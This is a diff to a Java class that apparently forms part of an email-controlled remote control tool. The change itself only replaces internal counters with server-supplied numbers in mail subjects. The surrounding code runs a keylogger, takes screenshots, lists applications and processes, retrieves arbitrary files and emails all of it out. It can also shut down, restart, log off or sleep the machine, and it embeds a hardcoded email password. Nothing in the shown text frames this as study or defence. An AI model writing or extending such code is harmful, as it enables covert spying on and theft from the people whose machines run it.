@@ -17,7 +17,6 @@ public class sendResponse extends Thread{
     final String DEFAULT_PASSWORD = "gorabwfzyfuqfkgy";
     int index = 0;
     String key;
-    private int[] counts = {0,0,0,0,0,0,0,0,0,0};
 
 
     private String getMail(String mail){
@@ -39,20 +38,18 @@ public class sendResponse extends Thread{
                 case "0 ": {
                     ListApp la = new ListApp();
                     File appList;
-                    counts[0]++;
                     try {
                         appList = la.run();
                     } catch (IOException e) {
                         throw new RuntimeException(e);
                     }
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 0 "+counts[0]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 0 "+Server.numberList.get(index));
                     sm.send(appList);
                     break;
                 }
                 case "1 ": {
                     kl.start();
-                    counts[1]++;
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 1 "+counts[1]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 1 "+Server.numberList.get(index));
                     sm.sendContent("Successful");
                     System.out.println(1);
                     break;
@@ -60,8 +57,7 @@ public class sendResponse extends Thread{
                 //end keylog
                 case "2 ": {
                     String text = kl.end();
-                    counts[2]++;
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 2 "+counts[2]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 2 "+Server.numberList.get(index));
                     FileWriter fw;
                     try {
                         fw = new FileWriter("keylog.txt");
@@ -86,14 +82,13 @@ public class sendResponse extends Thread{
                 //list app
                 case "3 ": {
                     ListPrc la = new ListPrc();
-                    counts[3]++;
                     File file;
                     try {
                         file = la.run();
                     } catch (IOException e) {
                         throw new RuntimeException(e);
                     }
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 3 "+counts[3]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 3 "+Server.numberList.get(index));
                     sm.send(file);
                     System.out.println(3);
                     break;
@@ -101,42 +96,37 @@ public class sendResponse extends Thread{
                 //screenshot
                 case "4 ": {
                     Screenshot sc = new Screenshot();
-                    counts[4]++;
                     File file;
                     file = sc.takeScreenShot();
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 4 "+counts[4]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 4 "+Server.numberList.get(index));
                     sm.send(file);
                     System.out.println(4);
                     break;
                 }
                 //shutdown
                 case "5 ": {
-                    counts[5]++;
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 5 "+counts[5]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 5 "+Server.numberList.get(index));
                     sm.sendContent("Successful");
                     SRS.shutdown();
                     break;
                 }
                 //restart
                 case "6 ": {
-                    counts[6]++;
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 6 "+counts[6]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 6 "+Server.numberList.get(index));
                     sm.sendContent("Successful");
                     SRS.restart();
                     break;
                 }
                 //logout
                 case "7 ": {
-                    counts[7]++;
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 7 "+counts[7]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 7 "+Server.numberList.get(index));
                     sm.sendContent("Successful");
                     SRS.logout();
                     break;
                 }
                 //sleep
                 case "8 ": {
-                    counts[8]++;
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 8 "+counts[8]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 8 "+Server.numberList.get(index));
                     sm.sendContent("Successful");
                     SRS.sleep();
                     break;
@@ -144,7 +134,6 @@ public class sendResponse extends Thread{
                 //getfile
                 case "9 ": {
                     String text = "Something wrong happened";
-                    counts[9]++;
                     GetFile gf = new GetFile();
 
                     if (Server.reqList.get(index).length()<=2){
@@ -160,7 +149,7 @@ public class sendResponse extends Thread{
                         }
                         else {
                             if (file.exists()){
-                                sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+counts[9]);
+                                sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+Server.numberList.get(index));
                                 sm.send(file);
                                 break;
                             }
@@ -186,7 +175,7 @@ public class sendResponse extends Thread{
                     } catch (IOException e) {
                         throw new RuntimeException(e);
                     }
-                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+counts[9]);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+Server.numberList.get(index));
                     sm.send(file);
                     break;
                 }
